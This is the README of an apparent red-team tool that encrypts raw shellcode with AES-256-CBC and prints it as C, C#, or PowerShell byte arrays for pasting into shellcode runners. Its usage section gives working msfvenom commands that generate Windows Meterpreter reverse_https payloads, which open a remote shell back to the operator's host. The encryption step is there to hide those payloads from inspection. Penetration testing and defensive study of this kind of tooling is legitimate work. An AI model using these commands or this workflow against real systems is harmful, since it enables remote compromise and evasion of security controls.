# AES Shellcode Encryptor

Encrypt raw shellcode and print AES‑encrypted payloads as byte arrays for copy‑pasting into shellcode runners (C, C#, PowerShell). Intended for red‑team / pentest usage.

## Contents

* `AesEncryptor.py` — CLI tool to:

  * Encrypt x64/x86 raw shellcode blobs using AES‑256‑CBC (PKCS7 padding).
  * Output IV, key and encrypted buffers in **C**, **C#**, or **PowerShell** byte-array formats suitable for pasting into shellcode runner code.

## Features

* AES‑256‑CBC encryption of raw shellcode bytes
* Outputs formatted ready-to-paste byte arrays for three common runtimes
* Support for both x64 (`--buf`) and x86 (`--buf86`) raw payloads
* Small, dependency-only runtime: `cryptography`

## Requirements

* Python 3.8+
* `cryptography` package

Install dependency:

```bash
pip install cryptography
```

## Quick usage

Generate a raw payload (works with any C2, create bin format shellcode):

```bash
# x64 raw
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o buf.bin
# x86 raw
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o buf86.bin
```

Run the encryptor (examples):

```bash
# Output in C format (default)
python AesEncryptor.py -c -buf buf.bin

# Output in PowerShell format
python AesEncryptor.py -powershell -buf buf.bin

# Output in C# format for both x64 and x86 payloads
python AesEncryptor.py -csharp -buf buf.bin -buf86 buf86.bin
```

Output will print AES key, AES IV (for debugging, must match first 16 bytes on encrypted buf), and encrypted buffers in the selected format for pasting into shellcode runner code.

## Notes

* AES key: 32 bytes (AES‑256)
* IV: 16 bytes (AES block size)
* Mode: CBC
* Padding: PKCS7
* Encrypted payload is returned as `IV || ciphertext` (IV concatenated in front of ciphertext) — this preserves IV for the decryptor.
* This script generates a fresh key & IV each run.
* This repo intentionally leaves decryption/runner code out. The encrypted blobs must be decrypted within a shellcode runner.

## TODO / ideas

* Add `-o` flag to write to files.
* Add optional key input.
* Template shellcode runners (C, C#, PS) that can decrypt and execute payloads. Populated when running this script
* Authenticated encryption (AES‑GCM).
